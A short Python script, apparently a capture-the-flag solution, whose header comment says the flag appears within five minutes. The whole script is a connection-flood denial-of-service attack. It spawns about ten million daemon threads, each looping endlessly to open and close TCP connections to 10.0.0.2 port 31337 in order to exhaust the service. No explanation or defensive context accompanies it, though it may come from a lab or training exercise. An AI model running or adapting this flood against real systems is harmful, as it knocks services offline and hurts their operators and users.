#Please run the script and wait. The flag should be output within 5 minutes.

import socket
import threading
import time

def func():
    while(1):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.0.0.2",31337))
        #s.recv(1024)
        s.close()

def func2():
    for i in range(1000):
        t= threading.Thread(target=func)
        t.daemon = True
        t.start()
        print("start...")
        
for i in range(10000):
    t= threading.Thread(target=func2)
    t.daemon = True
    t.start()
    print("started...")

time.sleep(1)